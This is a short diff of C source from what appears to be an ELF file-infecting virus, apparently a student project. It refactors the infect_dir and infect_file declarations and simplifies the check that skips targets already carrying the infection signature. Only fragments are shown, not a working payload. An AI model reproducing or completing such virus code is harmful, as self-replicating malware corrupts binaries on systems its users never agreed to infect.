@@ -48,8 +48,8 @@ __attribute__((always_inline)) inline uint64_t ft_mmap(void *addr, size_t length
 __attribute__((always_inline)) inline int64_t ft_munmap(void *addr, size_t length);
 
 // Functions
-__attribute__((always_inline)) inline int infect_dir(volatile char *dir_path, volatile int fd_self);
-__attribute__((always_inline)) inline int infect_file(volatile char *path, volatile file *file_self);
+__attribute__((always_inline)) static inline int infect_dir(volatile char *dir_path, volatile int fd_self);
+__attribute__((always_inline)) static inline int infect_file(volatile char *path, volatile file *file_self);
 __attribute__((always_inline)) inline int file_mmap(int fd, volatile file *file);
 __attribute__((always_inline)) inline int file_munmap(volatile file *file);
 __attribute__((always_inline)) inline int elf64_ident_check(volatile const Elf64_Ehdr *header);
@@ -194,8 +194,7 @@ infect_file(volatile char *path, volatile file *file_self) {
         return 1;
     };
 
-    volatile char *sign = signatur;
-    const uint8_t target_has_signature = ft_strstr(file_target.mem, sign, file_target.size);
+    const uint8_t target_has_signature = ft_strstr(file_target.mem, signatur, file_target.size);
     if (target_has_signature) {
         file_munmap(&file_target);
         ft_close(fd_target);
